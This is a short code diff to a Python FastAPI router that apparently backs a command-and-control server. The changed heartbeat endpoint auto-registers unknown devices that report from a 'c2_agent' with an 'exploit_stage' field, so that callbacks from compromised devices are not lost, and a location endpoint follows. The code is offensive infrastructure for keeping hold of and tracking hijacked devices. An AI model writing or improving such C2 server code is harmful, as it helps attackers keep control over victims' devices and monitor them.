@@ -53,15 +53,22 @@ def register_device(data: schemas.DeviceRegister, request: Request, db: Session 
 
 
 @router.post("/heartbeat", response_model=schemas.DeviceOut)
-def heartbeat(data: schemas.DeviceHeartbeat, db: Session = Depends(get_db)):
+def heartbeat(data: schemas.DeviceHeartbeat, request: Request, db: Session = Depends(get_db)):
     """
-    设备心跳（每30秒上报）
-    保持设备在线状态
+    设备心跳（c2_agent 约 15 秒一次）
+    未注册则自动 register，保证回连不丢
     """
     device = crud.update_device_heartbeat(db, data)
     if not device:
-        raise HTTPException(status_code=404, detail="Device not found, register first")
+        # 自动注册，避免刷新/重进后 404 导致“掉线”
+        device = crud.create_device(db, schemas.DeviceRegister(
+            device_uuid=data.device_uuid,
+            exploit_stage=data.exploit_stage,
+            extra=data.extra,
+        ), ip=request.client.host if request.client else None)
+        device = crud.update_device_heartbeat(db, data) or device
     return device
+
 
 
 @router.post("/location")
